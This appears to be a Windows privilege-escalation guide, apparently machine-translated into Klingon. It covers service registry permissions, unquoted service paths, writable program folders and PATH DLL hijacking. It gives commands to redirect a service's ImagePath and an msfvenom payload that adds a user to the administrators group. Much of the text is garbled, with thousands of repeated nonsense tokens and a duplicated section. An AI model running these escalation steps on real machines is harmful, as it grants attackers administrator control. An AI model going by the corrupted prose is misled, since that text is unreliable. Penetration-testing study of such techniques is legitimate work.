**'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** or **NT AUTHORITY\INTERACTIVE** possess `FullControl` permissions, it should be verified. If this is the case, the binary executed by the service can be modified.

To modify the Path of the executed binary:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:

```
### Services registry AppendData/AddSubdirectory permissions

If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
# tlh

## tlh

### tlh

#### tlh

##### tlh

###### tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh

tlh
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**ghaH 'ej exploit** vItlhutlh metasploit: `exploit/windows/local/trusted\_service\_path` 
metasploit Daq manually create service binary:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### QapHa'wI' Qap

Windows jatlh users to specify actions to be taken if a service fails. This feature can be configured to point to a binary. If this binary is replaceable, privilege escalation might be possible. More details can be found in the [official documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Qapmey

### Qapmey Qap

Check **permissions of the binaries** (maybe you can overwrite one and escalate privileges) and of the **folders** ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

Check if you can modify some config file to read some special file or if you can modify some binary that is going to be executed by an Administrator account (schedtasks).

A way to find weak folder/files permissions in the system is doing:

### qo' vItlhutlh

vItlhutlh config file vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh v
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### QaStaHvIS DaH jImej

**qaStaHvIS** **registry** **'ej** **binary** **yIqaw** **'e'** **user** **'e'** **cha'logh** **'e'** **'ej** **'oH** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

**ghItlh permissions** **'ej** **PATH** **vItlhutlh** **ghItlh** **'e'** **DLL** **'e'** **process** **lo'laH** **'ej** **'elevate** **privileges**.

**PATH** **vItlhutlh** **ghItlh** **'e'** **folders** **permissions** **yIlo'** **qaStaHvIS**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
ghItlh 'ej vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' 